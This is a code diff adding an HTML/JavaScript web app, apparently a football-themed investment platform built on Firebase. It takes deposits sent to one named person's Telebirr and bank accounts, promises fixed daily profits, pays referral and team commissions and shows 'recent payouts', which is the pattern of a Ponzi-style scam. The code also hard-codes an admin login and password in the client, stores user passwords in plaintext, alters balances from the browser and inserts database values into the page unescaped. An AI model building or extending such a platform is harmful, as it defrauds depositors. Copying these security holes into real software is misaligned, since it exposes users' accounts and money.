+                    <div class="photo-thumbnail" data-logo="https://upload.wikimedia.org/wikipedia/en/c/cc/Chelsea_FC.svg" onclick="selectLogo(this)"><img src="https://upload.wikimedia.org/wikipedia/en/c/cc/Chelsea_FC.svg" alt="CHE" onerror="this.src='https://via.placeholder.com/50?text=CHE'"></div>
+                    <div class="photo-thumbnail" data-logo="https://upload.wikimedia.org/wikipedia/en/b/b4/Tottenham_Hotspur.svg" onclick="selectLogo(this)"><img src="https://upload.wikimedia.org/wikipedia/en/b/b4/Tottenham_Hotspur.svg" alt="TOT" onerror="this.src='https://via.placeholder.com/50?text=TOT'"></div>
+                    <div class="photo-thumbnail" data-logo="https://logos-world.net/wp-content/uploads/2020/05/Manchester-City-Logo.png" onclick="selectLogo(this)"><img src="https://logos-world.net/wp-content/uploads/2020/05/Manchester-City-Logo.png" alt="MC" onerror="this.src='https://via.placeholder.com/50?text=MC'"></div>
+                    <div class="photo-thumbnail" data-logo="https://upload.wikimedia.org/wikipedia/en/0/0c/Liverpool_FC.svg" onclick="selectLogo(this)"><img src="https://upload.wikimedia.org/wikipedia/en/0/0c/Liverpool_FC.svg" alt="LFC" onerror="this.src='https://via.placeholder.com/50?text=LFC'"></div>
+                </div>
+                <p>Selected Logo URL: <span id="selectedLogoName" style="font-weight: bold; color: green;">None</span></p>
+
+                <input type="text" id="planName" placeholder="Team/Plan Name" required>
+                <input type="number" id="planPrice" placeholder="Investment Price ($)" required>
+                <input type="number" id="planProfit" placeholder="Daily Profit ($)" required>
+                <input type="number" id="planDays" placeholder="Maturity Days" required>
+                <input type="number" id="planLimit" placeholder="Purchase Limit (e.g. 1 for One-Time Only)" required>
+                <button onclick="createInvestmentPlan()">Create Plan</button>
+            </div>
+            <button class="logout-btn" onclick="logout()">Admin Logout</button>
+        </div>
+    </div>
+    
+    <div id="depositModalStep1" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeDepositModal()">&times;</span>
+            <h2>1. Deposit Amount & Method</h2>
+            <input type="number" id="depositAmount" placeholder="Enter Deposit Amount (Min 710 ETB)" required>
+            <p style="margin-top: 15px; font-weight: bold;">Select Payment Method:</p>
+            <div class="payment-option" data-method="Telebirr" onclick="selectPaymentMethod(this, '0968786454', 'Telebirr Account')">
+                <i class="fas fa-mobile-alt" style="margin-right: 10px;"></i> Telebirr
+            </div>
+            <div class="payment-option" data-method="CBE" onclick="selectPaymentMethod(this, '1000413205836', 'CBE Account Number')">
+                <i class="fas fa-university" style="margin-right: 10px;"></i> CBE (Commercial Bank of Ethiopia)
+            </div>
+            <div class="payment-option" data-method="Abyssinia" onclick="selectPaymentMethod(this, '247562753', 'Abyssinia Bank Account')">
+                <i class="fas fa-piggy-bank" style="margin-right: 10px;"></i> Abyssinia Bank
+            </div>
+            <div id="paymentInfo" class="payment-info" style="display:none; text-align: center;">
+                <p>Please send money to <strong style="color: #003366;">Abrham</strong>:</p>
+                <p id="accountType" style="margin-bottom: 5px; font-size: 0.9em;"></p>
+                <div style="display: flex; justify-content: center; align-items: center; background: #fff; padding: 10px; border: 1px dashed #003366; border-radius: 5px;">
+                    <strong id="accountNumber" style="font-size: 1.3em; letter-spacing: 1px; color: #333;"></strong>
+                    <button type="button" class="copy-acc-btn" onclick="copyDepositAccount()">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+            </div>
+            <button class="next-step" onclick="handleMakePaymentClick()" id="makePaymentBtn" disabled>Make Payment</button>
+        </div>
+    </div>
+    
+    <div id="depositModalStep2" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeDepositModal()">&times;</span>
+            <h2>2. Confirm Payment</h2>
+            <p>Please enter the **Transaction ID** (TID) or **Reference Number** for the <strong id="confirmMethod"></strong> payment of <strong id="confirmAmount"></strong> ETB.</p>
+            <input type="text" id="transactionIdInput" placeholder="Enter Transaction ID / Reference" required>
+            <button onclick="submitDepositRequest()">Completed</button>
+        </div>
+    </div>
+
+    <div id="giftModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeGiftModal()">&times;</span>
+            <h2>Redeem Gift Code</h2>
+            <p style="font-size:0.9em; color:#666;">Paste the code shared by the Admin to get free balance.</p>
+            <input type="text" id="giftCodeInput" placeholder="Enter Code Here (e.g. PL-X7Z...)" required style="text-align: center; font-weight: bold; letter-spacing: 1px;">
+            <button class="next-step" onclick="submitGiftRedemption()">Redeem Now</button>
+        </div>
+    </div>
+
+    <div id="bindBankModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeBindBankModal()">&times;</span>
+            <h2>Bind Bank Account</h2>
+            <p style="font-size: 0.9em; color: #666; margin-bottom: 10px;">
+                Enter your bank details to receive withdrawals.
+            </p>
+            <select id="bindBankName">
+                <option value="">-- Choose Bank --</option>
+                <option value="CBE">CBE (Commercial Bank of Ethiopia)</option>
+                <option value="Abyssinia">Abyssinia Bank</option>
+                <option value="Telebirr">Telebirr</option>
+                <option value="Awash">Awash Bank</option>
+                <option value="Dashen">Dashen Bank</option>
+                <option value="Hibret">Hibret Bank</option>
+            </select>
+            <input type="text" id="bindAccountName" placeholder="Full Account Name" required>
+            <input type="number" id="bindAccountNumber" placeholder="Account Number" required>
+            <hr style="margin: 15px 0; border: 0; border-top: 1px solid #eee;">
+            <p style="font-weight: bold; font-size: 0.9em;">Verification</p>
+            <input type="password" id="bindPassword" placeholder="Enter Login Password to Bind" required>
+            
+            <button onclick="bindBankAccount()" class="next-step">Bind Now</button>
+        </div>
+    </div>
+
+    <div id="profilePicModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeProfileModal()">&times;</span>
+            <h2>Change Profile Picture</h2>
+            <p style="margin-bottom: 15px; color: #555;">Choose an avatar:</p>
+            
+            <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; flex-wrap: wrap;">
+                <div class="photo-thumbnail" onclick="saveProfilePic('https://cdn-icons-png.flaticon.com/512/147/147142.png')"><img src="https://cdn-icons-png.flaticon.com/512/147/147142.png"></div>
+                <div class="photo-thumbnail" onclick="saveProfilePic('https://cdn-icons-png.flaticon.com/512/4140/4140048.png')"><img src="https://cdn-icons-png.flaticon.com/512/4140/4140048.png"></div>
+                <div class="photo-thumbnail" onclick="saveProfilePic('https://cdn-icons-png.flaticon.com/512/6997/6997662.png')"><img src="https://cdn-icons-png.flaticon.com/512/6997/6997662.png"></div>
+                <div class="photo-thumbnail" onclick="saveProfilePic('https://cdn-icons-png.flaticon.com/512/4140/4140047.png')"><img src="https://cdn-icons-png.flaticon.com/512/4140/4140047.png"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="withdrawModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeWithdrawModal()">&times;</span>
+            <h2>Request Withdrawal</h2>
+            
+            <div style="background-color: #e6f7ff; padding: 10px; border-radius: 5px; margin-bottom: 15px; border: 1px solid #b3e5fc;">
+                <p style="margin:0; font-size: 0.9em; font-weight: bold; color: #003366;">To: <span id="displayWithdrawBank"></span></p>
+                <p style="margin:5px 0 0 0; font-size: 0.85em; color: #555;">Acc: <span id="displayWithdrawAcc"></span></p>
+            </div>
+
+            <input type="number" id="withdrawAmount" placeholder="Amount to Withdraw (Min 150 ETB)" required>
+            
+            <p style="font-weight: bold; font-size: 0.9em; margin-top: 15px;">Confirm Withdrawal</p>
+            <input type="password" id="withdrawPassword" placeholder="Enter Login Password" required>
+            
+            <button onclick="submitWithdrawRequest()" class="next-step" style="margin-top: 20px;">Submit Request</button>
+        </div>
+    </div>
+
+    <div id="changePasswordModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeChangePasswordModal()">&times;</span>
+            <h2>Change Password</h2>
+            <p style="font-size: 0.9em; color: #666; margin-bottom: 15px;">Secure your account by updating your password.</p>
+            
+            <input type="password" id="oldPassword" placeholder="Current Password" required>
+            <input type="password" id="newPassword" placeholder="New Password" required>
+            <input type="password" id="confirmNewPassword" placeholder="Confirm New Password" required>
+            
+            <button onclick="submitChangePassword()" class="next-step" style="margin-top: 15px;">Update Password</button>
+        </div>
+    </div>
+
+    <div id="editPlanModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeEditModal()">&times;</span>
+            <h2>Edit Investment Plan</h2>
+            <input type="hidden" id="editPlanId">
+            <input type="text" id="editPlanName" placeholder="Team/Plan Name" required>
+            <input type="number" id="editPlanPrice" placeholder="Investment Price ($)" required>
+            <input type="number" id="editPlanProfit" placeholder="Daily Profit ($)" required>
+            <input type="number" id="editPlanDays" placeholder="Maturity Days" required>
+            <label>Current Logo URL: <span id="currentEditLogo" style="font-weight: bold;"></span></label>
+            <button onclick="saveEditedPlan()">Save Changes</button>
+        </div>
+    </div>
+    
+    <div id="recordsModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeRecordsModal()">&times;</span>
+            <h2>Withdrawal Records</h2>
+            <p style="font-size: 0.9em; color:#777; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:5px;">Recent payouts to our investors.</p>
+            <div id="publicWithdrawalList" class="record-list">
+                <p style="text-align:center; color:#999;">Loading...</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="teamDetailsModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeTeamDetailsModal()">&times;</span>
+            <h2>My Team Investors</h2>
+            <p style="font-size: 0.9em; color:#777; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:5px;">Direct referrals who have invested.</p>
+            <div id="teamListContainer" class="record-list">
+                <p>Loading...</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="telegramPopup" class="modal">
+        <div class="modal-content" style="text-align: center;">
+            <h2 style="color:#003366;">Join Our Community!</h2>
+            <p style="color:#555;">Stay updated with the latest news, payment proofs, and investment tips.</p>
+            
+            <div style="margin: 20px 0;">
+                <i class="fab fa-telegram-plane" style="font-size: 4em; color: #0088CC;"></i>
+            </div>
+            
+            <button onclick="joinTelegramAndClose()" class="next-step" style="background-color: #0088CC;">
+                <i class="fab fa-telegram-plane" style="margin-right:8px;"></i> Join Telegram Group
+            </button>
+            <button onclick="closeTelegramPopup()" style="background-color: #ccc; color: #333; margin-top: 10px;">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // FIREBASE CONFIG
+        const firebaseConfig = {
+            apiKey: "AIzaSyBZ-G6kba2ISgskrupu1soCoYWjuhNVZkw",
+            authDomain: "english-93588.firebaseapp.com",
+            databaseURL: "https://english-93588-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "english-93588",
+            storageBucket: "english-93588.firebasestorage.app",
+            messagingSenderId: "139206104660",
+            appId: "1:139206104660:web:f43c7e3eede6e394cfffc1",
+            measurementId: "G-LJYZ7310PV"
+        };
+
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = app.database();
+
+        // GLOBAL VARIABLES
+        let isLoginMode = true;
+        let currentUserPhone = null;
+        let currentUserData = null; // Store full user object here
+        let currentSelectedLogo = null; 
+        let claimInterval = null; 
+        let depositData = { amount: 0, method: '', account: '' };
+        
+        function getEthiopiaTime() {
+            return new Date(new Date().toLocaleString("en-US", { timeZone: "Africa/Addis_Ababa" }));
+        }
+
+        function toggleAuthMode() {
+            isLoginMode = !isLoginMode;
+            document.getElementById('authTitle').innerText = isLoginMode ? 'Login' : 'Register';
+            document.getElementById('authButton').innerText = isLoginMode ? 'Login' : 'Register';
+            document.getElementById('authSwitchText').innerText = isLoginMode ? "Don't have an account? " : "Already have an account? ";
+            document.querySelector('.auth-switch a').innerText = isLoginMode ? 'Register Now' : 'Login Now';
+            document.getElementById('authConfirmPassword').style.display = isLoginMode ? 'none' : 'block';
+            document.getElementById('authReferralCode').style.display = isLoginMode ? 'none' : 'block';
+            document.getElementById('message').innerText = '';
+        }
+
+        function getFullPhoneNumber(phone) {
+            if (phone === '1221') return "Admin"; 
+            if (phone && phone.length === 9 && !isNaN(phone)) return "+251" + phone;
+            return null; 
+        }
+
+        function loadUserData(userData) {
+            currentUserData = userData; // Keep global reference updated
+            const balance = userData.balance !== undefined ? parseFloat(userData.balance).toFixed(2) : '0.00';
+            const totalIncome = userData.totalIncome !== undefined ? parseFloat(userData.totalIncome).toFixed(2) : '0.00';
+            const totalRecharge = userData.totalRecharge !== undefined ? parseFloat(userData.totalRecharge).toFixed(2) : '0.00';
+            const totalWithdraw = userData.totalWithdraw !== undefined ? parseFloat(userData.totalWithdraw).toFixed(2) : '0.00';
+            const totalInvestment = userData.totalInvestment !== undefined ? parseFloat(userData.totalInvestment).toFixed(2) : '0.00';
+            
+            document.getElementById('currentBalanceHome').innerText = balance;
+            document.getElementById('currentBalanceMe').innerText = balance;
+            document.getElementById('totalIncome').innerText = totalIncome;
+            document.getElementById('currentUserPhone').innerText = `Phone: ${currentUserPhone}`;
+            document.getElementById('displayReferralCode').innerText = userData.referralCode || 'N/A';
+            
+            // Set Profile Picture
+            if (userData.profilePic) {
+                document.getElementById('userProfilePic').src = userData.profilePic;
+            } else {
+                document.getElementById('userProfilePic').src = 'https://cdn-icons-png.flaticon.com/512/149/149071.png';
+            }
+
+            // Me Page Stats
+            document.getElementById('meTotalRecharge').innerText = totalRecharge;
+            document.getElementById('meTotalWithdraw').innerText = totalWithdraw;
+            document.getElementById('meTotalInvestment').innerText = totalInvestment;
+            document.getElementById('meTotalIncome').innerText = totalIncome; 
+
+            const currentUrl = window.location.href.split('?')[0];
+            const refLink = `${currentUrl}?ref=${userData.referralCode}`;
+            document.getElementById('referralLink').innerText = refLink;
+            
+            if (userData.referralCode) loadTeamStats(userData.referralCode);
+            loadTeamCommissionStats(currentUserPhone);
+        }
+        
+        function loadTeamStats(referralCode) {
+            const usersRef = database.ref('users');
+            usersRef.orderByChild('referredBy').equalTo(referralCode).on('value', (snapshot) => {
+                const team = snapshot.val();
+                let totalInvited = 0;
+                let activeInvestors = 0;
+                let totalTeamVolume = 0;
+                
+                if (team) {
+                    totalInvited = Object.keys(team).length;
+                    Object.values(team).forEach(member => {
+                        const invested = parseFloat(member.totalInvestment || 0);
+                        if (invested > 0) {
+                            activeInvestors++;
+                            totalTeamVolume += invested;
+                        }
+                    });
+                }
+                document.getElementById('statTotalInvited').innerText = totalInvited;
+                document.getElementById('statActiveInvestors').innerText = activeInvestors;
+                document.getElementById('statTeamInvestment').innerText = `$${totalTeamVolume.toFixed(2)}`;
+            });
+        }
+
+        function loadTeamCommissionStats(phone) {
+            if (!phone) return;
+            database.ref('transaction_history/' + encodeURIComponent(phone)).once('value', (snapshot) => {
+                let totalComm = 0;
+                const history = snapshot.val();
+                if (history) {
+                    Object.values(history).forEach(tx => {
+                        if (tx.type === 'Referral Bonus' || tx.type === 'Team Commission') {
+                            totalComm += parseFloat(tx.amount || 0);
+                        }
+                    });
+                }
+                document.getElementById('statTotalCommission').innerText = '$' + totalComm.toFixed(2);
+            });
+        }
+
+        function handleLoginSuccess(phone, userData, isAdmin = false) {
+            currentUserPhone = phone;
+            currentUserData = userData; // Initialize global data
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('message').innerText = '';
+            
+            if (isAdmin) {
+                document.getElementById('mainApp').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                document.getElementById('appHeader').innerText = 'Admin Panel';
+                loadAdminInvestmentManagement(); 
+                loadDepositRequests(); 
+                loadWithdrawalRequests(); 
+                loadAdminGiftCodes(); 
+            } else {
+                document.getElementById('adminPanel').style.display = 'none';
+                document.getElementById('mainApp').style.display = 'block';
+                document.getElementById('appHeader').innerText = 'Investment Platform';
+                
+                setupUserAccountListeners(phone);
+                loadUserData(userData);
+                loadInvestmentPlans(); 
+                activateNavigation();
+                startSlideshow(); 
+                startIncomeSlideshow(); 
+                
+                showTelegramPopup();
+                
+                // Load Records in Background
+                loadPublicWithdrawalRecords();
+            }
+        }
+        
+        // --- FUNCTION TO LOAD PUBLIC WITHDRAWAL RECORDS ---
+        function loadPublicWithdrawalRecords() {
+            const container = document.getElementById('publicWithdrawalList');
+            // Fetch last 10 approved withdrawals
+            database.ref('withdrawal_requests').orderByChild('status').equalTo('Approved').limitToLast(10).on('value', snapshot => {
+                const data = snapshot.val();
+                if (!data) {
+                    container.innerHTML = '<p style="text-align:center; color:#999; font-size:0.9em;">No recent payouts.</p>';
+                    return;
+                }
+                
+                container.innerHTML = '';
+                // Sort by timestamp (newest first)
+                const records = Object.values(data).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                
+                records.forEach(item => {
+                    // Mask Phone: 0911223344 -> 0911****44 or +2519...
+                    let displayPhone = item.userPhone;
+                    if (displayPhone.length > 8) {
+                        displayPhone = displayPhone.substring(0, 5) + '****' + displayPhone.substring(displayPhone.length - 2);
+                    }
+                    
+                    const dateObj = new Date(item.timestamp);
+                    const timeStr = dateObj.toLocaleDateString() + ' ' + dateObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+                    const html = `
+                        <div class="record-item">
+                            <div class="record-user">
+                                <i class="fas fa-user-circle"></i>
+                                <span>${displayPhone}</span>
+                            </div>
+                            <div>
+                                <span class="record-amount">+${parseFloat(item.amount).toFixed(2)} ETB</span>
+                                <span class="record-date">${timeStr}</span>
+                            </div>
+                        </div>
+                    `;
+                    container.innerHTML += html;
+                });
+            });
+        }
+        // --------------------------------------------------------
+
+        // RECORDS MODAL CONTROLS
+        function openRecordsModal() {
+            document.getElementById('recordsModal').style.display = 'block';
+        }
+        function closeRecordsModal() {
+            document.getElementById('recordsModal').style.display = 'none';
+        }
+        
+        function setupUserAccountListeners(phone) {
+            const userRef = database.ref('users/' + encodeURIComponent(phone));
+            userRef.on('value', (snapshot) => {
+                const userData = snapshot.val();
+                if (userData) {
+                    loadUserData(userData);
+                }
+            });
+            database.ref('user_investments/' + encodeURIComponent(phone)).on('value', (snapshot) => {
+                loadActiveInvestments(snapshot);
+                startClaimInterval(snapshot.val()); 
+            });
+        }
+        
+        function logout() {
+            if (currentUserPhone) {
+                database.ref('users/' + encodeURIComponent(currentUserPhone)).off('value');
+                database.ref('user_investments/' + encodeURIComponent(currentUserPhone)).off('value');
+            }
+            database.ref('investment_plans').off('value'); 
+            database.ref('deposit_requests').off('value');
+            database.ref('withdrawal_requests').off('value');
+            database.ref('gift_codes').off('value'); 
+            if (slideshowInterval) clearInterval(slideshowInterval);
+            if (incomeSlideshowInterval) clearInterval(incomeSlideshowInterval); 
+            if (claimInterval) clearInterval(claimInterval);
+            currentUserPhone = null;
+            currentUserData = null;
+            document.getElementById('mainApp').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('authOverlay').style.display = 'flex';
+            isLoginMode = false;
+            toggleAuthMode();
+            document.getElementById('authForm').reset();
+        }
+
+        function generateReferralCode() {
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let result = "";
+            for (let i = 0; i < 6; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        // AUTHENTICATION
+        document.getElementById('authForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const phoneNumberInput = document.getElementById('authPhoneNumber').value.trim();
+            const password = document.getElementById('authPassword').value;
+            const messageElement = document.getElementById('message');
+            messageElement.innerText = 'Processing...';
+
+            if (phoneNumberInput === '1221') {
+                if (password === 'a2213') {
+                    handleLoginSuccess("Admin", null, true);
+                    return;
+                } else {
+                    messageElement.innerText = 'Login Failed: Invalid Admin password.';
+                    return;
+                }
+            }
+            const fullPhoneNumber = getFullPhoneNumber(phoneNumberInput);
+            if (!fullPhoneNumber) {
+                messageElement.innerText = 'Invalid phone number format. Use 9XXXXXXXX.';
+                return;
+            }
+
+            const dbKey = encodeURIComponent(fullPhoneNumber); 
+            const usersRef = database.ref('users');
+            
+            try {
+                const userSnapshot = await usersRef.child(dbKey).once('value');
+                const userData = userSnapshot.val();
+
+                if (isLoginMode) {
+                    if (userData && userData.password === password) {
+                        handleLoginSuccess(fullPhoneNumber, userData, false);
+                    } else {
+                        messageElement.innerText = 'Login Failed: Phone or Password is incorrect.';
+                    }
+                } else {
+                    const confirmPassword = document.getElementById('authConfirmPassword').value;
+                    if (password !== confirmPassword) {
+                        messageElement.innerText = 'Registration Failed: Passwords do not match.';
+                        return;
+                    }
+                    if (userData) {
+                        messageElement.innerText = 'Registration Failed: Account already exists.';
+                        return;
+                    }
+                    
+                    const newUser = {
+                        password: password, 
+                        createdAt: new Date().toISOString(),
+                        balance: 50.00, // SIGNUP BONUS
+                        totalInvestment: 0.00, 
+                        totalRecharge: 0.00,
+                        totalWithdraw: 0.00,
+                        totalIncome: 0.00, 
+                        referralCode: generateReferralCode(), 
+                        referredBy: document.getElementById('authReferralCode').value.trim() || ''
+                    };
+                    
+                    await usersRef.child(dbKey).set(newUser)
+                        .then(() => {
+                            logTransactionHistory(fullPhoneNumber, 'Signup Bonus', 50.00, 'Credit', 'Completed', 'Welcome Gift');
+                            handleLoginSuccess(fullPhoneNumber, newUser, false);
+                        })
+                        .catch(error => messageElement.innerText = 'Registration Failed: ' + error.message);
+                }
+            } catch (error) {
+                messageElement.innerText = 'DB Error: ' + error.message;
+            }
+        });
+
+        // SLIDESHOW (FOOTBALL IMAGES)
+        const slideshowImages = [
+            'https://images.pexels.com/photos/270085/pexels-photo-270085.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', // Football Stadium
+            'https://images.pexels.com/photos/399187/pexels-photo-399187.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1', // Ball in Net
+            'https://images.pexels.com/photos/1884574/pexels-photo-1884574.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1' // Football match
+        ];
+        let slideIndex = 0;
+        let slideshowInterval;
+        const slideElement = document.getElementById('slideshowImage');
+
+        function showSlides() {
+            if (!slideElement) return;
+            slideElement.style.opacity = 0; 
+            setTimeout(() => {
+                slideElement.src = slideshowImages[slideIndex];
+                slideIndex++;
+                if (slideIndex >= slideshowImages.length) slideIndex = 0; 
+                slideElement.style.opacity = 1; 
+            }, 500); 
+        }
+        function startSlideshow() {
+            if (slideshowInterval) clearInterval(slideshowInterval);
+            showSlides(); 
+            slideshowInterval = setInterval(showSlides, 5000); 
+        }
+
+        // INCOME SLIDESHOW
+        const incomeSlideshowImages = [
+            'https://images.pexels.com/photos/164527/pexels-photo-164527.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1',
+            'https://images.pexels.com/photos/6801874/pexels-photo-6801874.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1',
+            'https://images.pexels.com/photos/4968391/pexels-photo-4968391.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=1'
+        ];
+        let incomeSlideIndex = 0;
+        let incomeSlideshowInterval;
+        const incomeSlideElement = document.getElementById('incomeSlideshowImage');
+
+        function showIncomeSlides() {
+            if (!incomeSlideElement) return;
+            incomeSlideElement.style.opacity = 0;
+            setTimeout(() => {
+                incomeSlideElement.src = incomeSlideshowImages[incomeSlideIndex];
+                incomeSlideIndex++;
+                if (incomeSlideIndex >= incomeSlideshowImages.length) incomeSlideIndex = 0;
+                incomeSlideElement.style.opacity = 1;
+            }, 500);
+        }
+
+        function startIncomeSlideshow() {
+            if (incomeSlideshowInterval) clearInterval(incomeSlideshowInterval);
+            showIncomeSlides();
+            incomeSlideshowInterval = setInterval(showIncomeSlides, 5000); 
+        }
+
+        // DEPOSIT MODAL
+        function openDepositModal() {
+            if (!currentUserPhone) return;
+            document.getElementById('depositAmount').value = '';
+            document.getElementById('transactionIdInput').value = '';
+            depositData = { amount: 0, method: '', account: '' };
+            document.getElementById('paymentInfo').style.display = 'none';
+            document.getElementById('makePaymentBtn').disabled = true;
+            document.querySelectorAll('.payment-option').forEach(el => el.classList.remove('selected'));
+            document.getElementById('depositModalStep1').style.display = 'block';
+            document.getElementById('depositModalStep2').style.display = 'none';
+        }
+        function closeDepositModal() {
+            document.getElementById('depositModalStep1').style.display = 'none';
+            document.getElementById('depositModalStep2').style.display = 'none';
+        }
+        function selectPaymentMethod(element, accountNumber, accountType) {
+            document.querySelectorAll('.payment-option').forEach(el => el.classList.remove('selected'));
+            element.classList.add('selected');
+            const method = element.getAttribute('data-method');
+            document.getElementById('accountNumber').innerText = accountNumber;
+            document.getElementById('accountType').innerText = accountType;
+            document.getElementById('makePaymentBtn').disabled = false;
+            depositData.method = method;
+            depositData.account = accountNumber;
+            document.getElementById('paymentInfo').style.display = 'block';
+        }
+        function copyDepositAccount() {
+            const accNum = document.getElementById('accountNumber').innerText;
+            navigator.clipboard.writeText(accNum).then(() => alert('Account Number Copied!')).catch(err => alert('Copy manually.'));
+        }
+        function handleMakePaymentClick() {
+            const amount = parseFloat(document.getElementById('depositAmount').value);
+            if (isNaN(amount) || amount < 710) return alert("Please enter a valid amount (minimum 710 ETB).");
+            if (!depositData.method) return alert("Please select a payment method.");
+            depositData.amount = amount;
+            document.getElementById('confirmMethod').innerText = depositData.method;
+            document.getElementById('confirmAmount').innerText = depositData.amount.toFixed(2);
+            document.getElementById('depositModalStep1').style.display = 'none';
+            document.getElementById('depositModalStep2').style.display = 'block';
+        }
+
+        async function submitDepositRequest() {
+            const transactionId = document.getElementById('transactionIdInput').value.trim();
+            if (!transactionId) return alert("Please enter the Transaction ID.");
+            
+            const txKey = logTransactionHistory(currentUserPhone, 'Deposit Request', depositData.amount, 'Credit', 'Pending', `TID: ${transactionId}`);
+
+            const newRequest = {
+                userPhone: currentUserPhone,
+                amount: depositData.amount,
+                method: depositData.method,
+                adminAccount: depositData.account,
+                transactionId: transactionId,
+                status: 'Pending',
+                timestamp: new Date().toISOString(),
+                historyId: txKey 
+            };
+
+            await database.ref('deposit_requests').push(newRequest)
+                .then(() => {
+                    alert('Deposit request submitted! Waiting for Admin approval.');
+                    closeDepositModal();
+                })
+                .catch(error => alert('Error: ' + error.message));
+        }
+
+        // GIFT CODE LOGIC
+        function openGiftModal() {
+            if (!currentUserPhone) return;
+            document.getElementById('giftCodeInput').value = '';
+            document.getElementById('giftModal').style.display = 'block';
+        }
+        
+        function closeGiftModal() {
+            document.getElementById('giftModal').style.display = 'none';
+        }
+
+        async function submitGiftRedemption() {
+            const code = document.getElementById('giftCodeInput').value.trim();
+            if(!code) return alert("Please enter a code.");
+            
+            const giftRef = database.ref('gift_codes/' + code);
+            const userRef = database.ref('users/' + encodeURIComponent(currentUserPhone));
+
+            try {
+                const snapshot = await giftRef.once('value');
+                const giftData = snapshot.val();
+
+                if(!giftData) return alert("Invalid Gift Code.");
+                if(giftData.status !== 'active') return alert("This code has already been used.");
+
+                const now = Date.now();
+                if (giftData.expiresAt && now > giftData.expiresAt) {
+                    return alert("This code has EXPIRED and is no longer valid.");
+                }
+
+                await userRef.transaction(userData => {
+                    if (userData) {
+                        userData.balance = (userData.balance || 0) + parseFloat(giftData.amount);
+                        userData.totalIncome = (userData.totalIncome || 0) + parseFloat(giftData.amount); 
+                        return userData;
+                    }
+                });
+
+                await giftRef.update({
+                    status: 'used',
+                    usedBy: currentUserPhone,
+                    usedAt: new Date().toISOString()
+                });
+
+                logTransactionHistory(currentUserPhone, 'Gift Redeemed', parseFloat(giftData.amount), 'Credit', 'Completed', `Code: ${code}`);
+
+                alert(`Success! $${giftData.amount} added to your balance.`);
+                closeGiftModal();
+
+            } catch(e) {
+                alert("Error redeeming code: " + e.message);
+            }
+        }
+
+        function generateGiftCode() {
+            const amount = parseFloat(document.getElementById('giftCodeAmount').value);
+            const minutes = parseInt(document.getElementById('giftCodeMinutes').value);
+
+            if(isNaN(amount) || amount <= 0) return alert("Enter valid amount.");
+            if(isNaN(minutes) || minutes <= 0) return alert("Enter valid minutes.");
+
+            const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+            let randomStr = "";
+            for(let i=0; i<6; i++) randomStr += chars.charAt(Math.floor(Math.random() * chars.length));
+            const code = "PL-" + randomStr;
+
+            const expiresAt = Date.now() + (minutes * 60 * 1000); 
+
+            database.ref('gift_codes/' + code).set({
+                amount: amount,
+                expiresAt: expiresAt, 
+                status: 'active',
+                createdAt: new Date().toISOString()
+            }).then(() => {
+                alert(`Code Created: ${code}\nValid for ${minutes} minutes.`);
+                document.getElementById('giftCodeAmount').value = '';
+                document.getElementById('giftCodeMinutes').value = '';
+            });
+        }
+
+        function loadAdminGiftCodes() {
+            const container = document.getElementById('activeGiftCodesList');
+            database.ref('gift_codes').orderByChild('status').equalTo('active').on('value', snapshot => {
+                const codes = snapshot.val();
+                container.innerHTML = '';
+                if(!codes) {
+                    container.innerHTML = '<p>No active gift codes.</p>';
+                    return;
+                }
+                
+                const now = Date.now();
+
+                Object.keys(codes).forEach(key => {
+                    const data = codes[key];
+                    let timeText = "";
+                    let color = "#003366";
+                    
+                    if (data.expiresAt) {
+                         const minutesLeft = Math.ceil((data.expiresAt - now) / 60000);
+                         if (minutesLeft <= 0) {
+                             timeText = "(EXPIRED)";
+                             color = "red";
+                         } else {
+                             timeText = `(${minutesLeft}m left)`;
+                         }
+                    }
+
+                    container.innerHTML += `
+                        <div class="code-display" style="color: ${color};">
+                            <span>${key} - $${data.amount} ${timeText}</span>
+                            <button onclick="navigator.clipboard.writeText('${key}')" style="background:#003366; color:white; border:none; padding:5px 10px; border-radius:3px; cursor:pointer;">Copy</button>
+                        </div>
+                    `;
+                });
+            });
+        }
+
+        // BIND BANK LOGIC
+        function openBindBankModal() {
+            if (!currentUserPhone) return;
+            if (currentUserData && currentUserData.bankDetails) {
+                document.getElementById('bindBankName').value = currentUserData.bankDetails.bankName || '';
+                document.getElementById('bindAccountName').value = currentUserData.bankDetails.accountName || '';
